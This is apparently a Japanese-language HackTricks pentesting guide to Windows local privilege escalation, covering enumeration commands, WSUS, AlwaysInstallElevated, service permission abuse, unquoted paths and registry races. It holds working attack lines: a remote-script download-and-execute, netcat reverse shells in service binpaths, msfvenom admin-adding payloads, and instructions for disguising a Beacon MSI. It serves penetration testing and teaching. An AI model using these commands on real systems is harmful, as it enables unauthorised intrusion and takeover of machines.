# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors を探すためのベストツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows の基礎理論

### Access Tokens

**Windows Access Tokens が何か分からない場合は、続ける前に次のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs の詳細については、次のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の integrity levels が分からない場合は、続ける前に次のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows には、システムの列挙、実行ファイルの実行、あるいは **あなたの活動の検知** を**妨げる** 可能性のあるものがいくつかあります。privilege escalation の列挙を始める前に、次の **ページ** を**読んで**、これらすべての **defenses** **mechanisms** を**列挙**してください:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` 経由で起動された UIAccess process は、AppInfo secure-path checks を回避すると、プロンプトなしで High IL に到達するために悪用できます。専用の UIAccess/Admin Protection bypass workflow はここを確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation は、任意の SYSTEM registry write (RegPwn) に悪用できます:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近の Windows builds では、特権のあるローカル NTLM authentication を再利用された SMB TCP connection 上で反射させる **SMB arbitrary-port** LPE path も導入されました:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Windows version に既知の vulnerability があるか確認してください (適用済みの patches も確認してください)。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

この[site](https://msrc.microsoft.com/update-guide/vulnerability)は、Microsoft security vulnerabilities の詳細情報を検索するのに便利です。このデータベースには 4,700 件以上の security vulnerabilities があり、Windows 環境が持つ **massive attack surface** を示しています。

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

env variables に保存されている credential/Juicy info はありますか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell History
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

これを有効にする方法は、[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) で学べます
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell パイプラインの実行詳細が記録され、実行されたコマンド、コマンドの呼び出し、スクリプトの一部が含まれます。ただし、完全な実行詳細や出力結果は記録されない場合があります。

これを有効にするには、ドキュメントの "Transcript files" セクションの手順に従い、**"Powershell Transcription"** ではなく **"Module Logging"** を選択してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs から最後の 15 件のイベントを表示するには、次を実行できます:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

スクリプトの実行における完全なアクティビティと全文が記録され、各コードブロックが実行されるたびに文書化されます。このプロセスは、各アクティビティの包括的な監査証跡を保持し、フォレンジックや悪意ある挙動の分析に有用です。実行時にすべてのアクティビティを記録することで、プロセスに関する詳細な洞察が得られます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block のログイベントは、Windows Event Viewer の以下のパスで確認できます: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
直近20件のイベントを表示するには、次を使用できます:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet Settings
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

updates が http**S** ではなく http を使って要求されている場合、システムを侵害できます。

まず、cmd で以下を実行して、ネットワークが non-SSL の WSUS update を使っているか確認します:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または PowerShell では:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
次のような応答を受け取った場合:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
そして、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` が `1` と等しい場合。

**それは exploit 可能です。** もし最後の registry が 0 と等しいなら、WSUS エントリは無視されます。

この脆弱性を exploit するには、次のような tools を使えます: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- これらは、非 SSL の WSUS traffic に「fake」 updates を注入するための MiTM weaponized exploit scripts です。

研究はこちらを読んでください:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**完全な report はこちらを読んでください**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。\
基本的には、これがこの bug が exploit する flaw です:

> もし local user proxy を変更する権限があり、かつ Windows Updates が Internet Explorer の settings で設定された proxy を使うなら、私たちは [PyWSUS](https://github.com/GoSecure/pywsus) を local で実行して自分自身の traffic を intercept し、asset 上で elevated user として code を実行する権限を持つことになります。
>
> さらに、WSUS service は current user の settings を使うため、certificate store も使います。WSUS hostname 用の self-signed certificate を生成し、この certificate を current user の certificate store に追加すれば、HTTP と HTTPS の両方の WSUS traffic を intercept できます。WSUS は、certificate に対して trust-on-first-use 型の validation を実装するための HSTS のような mechanism を使っていません。提示された certificate が user に信頼され、正しい hostname を持っていれば、service に受け入れられます。

この vulnerability は tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) を使って exploit できます（liberated されたら）。

## Third-Party Auto-Updaters and Agent IPC (local privesc)

多くの enterprise agent は localhost の IPC surface と privileged update channel を公開しています。enrollment を attacker server に強制でき、updater が rogue root CA や弱い signer checks を信頼する場合、local user は SYSTEM service がインストールする malicious MSI を配信できます。一般化された technique（Netskope stAgentSvc chain – CVE-2025-0309 に基づく）はこちら:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` は、attacker-controlled messages を処理する localhost service を **TCP/9401** で公開しており、**NT AUTHORITY\SYSTEM** として arbitrary commands を実行できます。

- **Recon**: listener と version を確認します。例: `netstat -ano | findstr 9401` と `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: 必要な Veeam DLLs と一緒に `VeeamHax.exe` のような PoC を同じ directory に置き、その後 local socket 経由で SYSTEM payload を trigger します:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
サービスはそのコマンドをSYSTEMとして実行します。
## KrbRelayUp

Windows **domain** 環境では、特定の条件下で **local privilege escalation** の脆弱性が存在します。これらの条件には、**LDAP signing is not enforced,** ユーザーが **Resource-Based Constrained Delegation (RBCD)** を設定できる self-rights を持っていること、そしてユーザーが domain 内で computer を作成できることが含まれます。これらの **requirements** は **default settings** で満たされることに注意してください。

**exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) を確認してください

攻撃の流れについてさらに詳しくは [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) を確認してください

## AlwaysInstallElevated

**If** これら 2 つの registers が **enabled** されている場合 (value は **0x1** )、権限に関係なく任意のユーザーが `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として **install** (execute) できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
meterpreter セッションがある場合、この手法はモジュール **`exploit/windows/local/always_install_elevated`** を使って自動化できます

### PowerUP

power-up の `Write-UserAddMSI` コマンドを使って、現在のディレクトリ内に権限昇格用の Windows MSI バイナリを作成します。このスクリプトは、ユーザー/グループ追加を求める事前コンパイル済みの MSI インストーラを書き出します（そのため GIU アクセスが必要です）:
```
Write-UserAddMSI
```
作成した binary を実行して権限を昇格するだけです。

### MSI Wrapper

この tools を使って MSI wrapper を作成する方法を学ぶには、この tutorial を読んでください。 **.bat** ファイルも、**command lines** を実行したいだけなら wrap できます。

{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike または Metasploit で、`C:\privesc\beacon.exe` に **new Windows EXE TCP payload** を **Generate** する
- **Visual Studio** を開き、**Create a new project** を選び、検索ボックスに "installer" と入力する。**Setup Wizard** プロジェクトを選択して **Next** をクリックする。
- プロジェクト名を **AlwaysPrivesc** などにし、場所に **`C:\privesc`** を指定し、**place solution and project in the same directory** を選んで、**Create** をクリックする。
- **Next** をクリックし続け、4段階中の 3 つ目の手順（include する files を選ぶ画面）まで進む。**Add** をクリックして、さきほど生成した Beacon payload を選択する。次に **Finish** をクリックする。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更する。
- **Author** や **Manufacturer** など、インストールされた app をより正当らしく見せられる他の properties も変更できる。
- プロジェクトを右クリックして **View > Custom Actions** を選択する。
- **Install** を右クリックして **Add Custom Action** を選択する。
- **Application Folder** をダブルクリックし、**beacon.exe** ファイルを選択して **OK** をクリックする。これで、installer が実行されるとすぐに beacon payload が実行されるようになる。
- **Custom Action Properties** の下で、**Run64Bit** を **True** に変更する。
- 最後に、**build it** する。
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` という警告が表示された場合は、platform を x64 に設定していることを確認する。

### MSI Installation

悪意ある `.msi` ファイルの **installation** を **background:** で実行するには
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を悪用するには、_exploit/windows/local/always_install_elevated_ を使用できます。

## Antivirus and Detectors

### Audit Settings

これらの設定は、何が**ログに記録される**かを決定するため、注意する必要があります
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding は、ログがどこに送信されるかを知る上で重要です
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** は、**ローカル Administrator パスワードの管理**のために設計されており、ドメインに参加しているコンピュータ上で各パスワードが**一意で、ランダム化され、定期的に更新**されることを保証します。これらのパスワードは Active Directory 内に安全に保存され、ACL を通じて十分な権限を付与されたユーザーのみがアクセスでき、許可されている場合はローカル admin パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文パスワードは LSASS** (Local Security Authority Subsystem Service) に保存されます。\
[**WDigest についての詳細はこちらのページ**](../stealing-credentials/credentials-protections.md#wdigest)。
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) に対する強化された保護を導入し、信頼されていないプロセスによるそのメモリの**読み取り**やコードの注入の試みを**ブロック**して、システムの安全性をさらに高めました。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection)。
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash attacks のような脅威から、デバイスに保存された credentials を保護することです。| [**Credentials Guard についての詳細はこちら。**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### キャッシュされた資格情報

**Domain credentials** は **Local Security Authority** (LSA) によって認証され、OS コンポーネントで利用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーの domain credentials が確立されます。\
[**Cached Credentials についての詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザー & グループ

### ユーザー & グループを列挙する

自分が所属しているグループに、興味深い権限があるものがないか確認すべきです
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

もしあなたが**何らかの特権グループに所属しているなら、権限昇格できる可能性があります**。特権グループと、それを悪用して権限昇格する方法についてはここを参照してください:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### トークン操作

**トークン**とは何かについては、このページで**さらに学べます**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
興味深いトークンについて**学び**、それをどう悪用するかについては、次のページを確認してください:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログイン中のユーザー / セッション
```bash
qwinsta
klist sessions
```
### ホームフォルダ
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダの権限

まず、プロセスの一覧を確認するときは、**プロセスのコマンドライン内にパスワードが含まれていないか確認**してください。\
実行中のバイナリの一部を**上書きできるか**、またはバイナリフォルダに書き込み権限があるかを確認して、可能な [**DLL Hijacking attacks**](dll-hijacking/index.html) を悪用してください:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に実行中の[**electron/cef/chromium debuggers**](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md)がないか確認してください。権限昇格に悪用できる可能性があります。

**プロセスのバイナリの権限を確認する**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリのフォルダの権限を確認する（**[**DLL Hijacking**](dll-hijacking/index.html)**）**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

**procdump** from sysinternals を使って、実行中のプロセスのメモリダンプを作成できます。FTP のようなサービスは **credentials in clear text in memory** を持っていることがあるので、メモリをダンプして credentials を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**SYSTEMで実行されているApplicationsは、userがCMDを起動したり、directoriesを参照したりできる場合があります。**

Example: "Windows Help and Support" (Windows + F1) で "command prompt" を検索し、"Click to open Command Prompt" をクリックする

## Services

Service Triggers により、Windows は特定の条件が発生したときに service を起動できます（named pipe/RPC endpoint activity、ETW events、IP availability、device arrival、GPO refresh など）。SERVICE_START 権限がなくても、trigger を発火させることで privileged services を起動できることがよくあります。列挙と activation techniques はここを参照してください:

-
{{#ref}}
service-triggers.md
{{#endref}}

Get a list of services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

**sc** を使ってサービスの情報を取得できます
```bash
sc qc <service_name>
```
各サービスに必要な権限レベルを確認するために、_Sysinternals_ のバイナリ **accesschk** を用意しておくことが推奨されます。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users" が任意の service を変更できるか確認することを推奨します:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP用のaccesschk.exeはここからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効化する

このエラーが発生する場合（たとえばSSDPSRVで）:

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

以下を使って有効化できます
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**XP SP1では、サービス upnphost は動作するために SSDPSRV に依存することに注意してください**

**この問題に対する別の回避策** は次を実行することです:
```
sc.exe config usosvc start= auto
```
### **サービスの binary path を変更する**

"Authenticated users" グループがある service に対して **SERVICE_ALL_ACCESS** を持っている場合、service の executable binary を変更できます。**sc** を変更して実行するには:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスの再起動
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
権限はさまざまな許可によって昇格できます:

- **SERVICE_CHANGE_CONFIG**: サービスの binary の再設定を許可します。
- **WRITE_DAC**: 権限の再設定を可能にし、サービス設定を変更できるようにします。
- **WRITE_OWNER**: 所有権の取得と権限の再設定を許可します。
- **GENERIC_WRITE**: サービス設定を変更する能力を継承します。
- **GENERIC_ALL**: サービス設定を変更する能力も継承します。

この脆弱性の検出と悪用には、_exploit/windows/local/service_permissions_ を利用できます。

### Services binaries weak permissions

**サービスによって実行される binary を変更できるか**、または binary が配置されているフォルダに対して **write permissions** を持っているかを確認してください ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
**wmic** を使えば、サービスによって実行されるすべての binary（system32 以外）を取得でき、**icacls** を使って権限を確認できます:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
**sc** と **icacls** も使えます:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Services registry modify permissions

サービスのregistryを変更できるか確認してください。\
serviceのregistryに対する**permissions**は次の方法で**check**できます:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているか確認する必要があります。もしそうなら、サービスによって実行される binary を変更できます。

実行される binary の Path を変更するには:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

一部の Windows Accessibility 機能は、ユーザーごとの **ATConfig** キーを作成し、その後 **SYSTEM** プロセスによって HKLM のセッションキーへコピーされます。Registry の **symbolic link race** を使うと、この特権書き込みを **任意の HKLM path** に向けられ、任意の HKLM **value write** primitive が得られます。

主要な場所（例: On-Screen Keyboard `osk`）:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` はインストール済みの accessibility features を列挙します。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` はユーザー制御可能な設定を保存します。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` は logon/secure-desktop の遷移中に作成され、ユーザーが書き込み可能です。

Abuse flow (CVE-2026-24291 / ATConfig):

1. SYSTEM に書き込ませたい **HKCU ATConfig** value を用意します。
2. secure-desktop の copy をトリガーします（例: **LockWorkstation**）。これにより AT broker flow が開始されます。
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を置いて **race** に勝ちます。oplock が発火したら、**HKLM Session ATConfig** key を保護された HKLM target への **registry link** に置き換えます。
4. SYSTEM が、攻撃者が選んだ value をリダイレクト先の HKLM path に書き込みます。

任意の HKLM value write を得たら、service configuration values を上書きして LPE に移行します:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

通常ユーザーが開始できる service（例: **`msiserver`**）を選び、書き込み後にそれを起動します。**Note:** 公開されている exploit implementation は、この race の一部として **locks the workstation** します。

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### サービス registry AppendData/AddSubdirectory 権限

レジストリに対してこの権限がある場合、**このレジストリからサブレジストリを作成できる**ことを意味します。Windows services の場合、これは**任意のコードを実行するのに十分**です:

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルへの path が quotes で囲まれていない場合、Windows はスペースの前までの各末尾を順に実行しようとします。

たとえば、path _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次を実行しようとします:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込みのWindowsサービスに属するものを除いた、すべてのunquoted service pathsを列挙してください:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**この脆弱性は** metasploit で検出および悪用できます: `exploit/windows/local/trusted\_service\_path` metasploit でサービスバイナリを手動で作成することもできます:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows では、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能は、バイナリを指すように設定できます。このバイナリが置き換え可能であれば、権限昇格が可能な場合があります。詳細は [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) を参照してください。

## Applications

### Installed Applications

**バイナリの権限**（1つを書き換えて権限昇格できるかもしれません）と、**フォルダ**（[DLL Hijacking](dll-hijacking/index.html)）を確認してください。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Write Permissions

構成ファイルを変更して特定のファイルを読み取れるか、または Administrator アカウントで実行されるバイナリを変更できるかを確認します (schedtasks)。

システム内で弱い folder/files permissions を見つける方法の1つは、次のとおりです:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
